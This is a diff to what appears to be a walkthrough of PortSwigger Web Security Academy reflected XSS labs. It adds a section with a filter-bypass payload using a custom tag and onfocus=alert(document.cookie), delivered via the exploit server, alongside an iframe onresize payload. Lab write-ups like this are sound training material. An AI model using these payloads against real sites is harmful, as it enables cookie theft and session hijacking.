@@ -114,12 +114,20 @@ Go back to the Positions tab in Burp Intruder and replace your search term and s
  
  Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
  
-     <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+    <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
      
   Click "Store" and "Deliver exploit to victim". 
  
  
+ ## 5. Reflected XSS into HTML context with all tags blocked except custom ones
  
+  Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
+  
+    <script>
+    location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+    </script>
+  
+ Click "Store" and "Deliver exploit to victim".
  
  
  
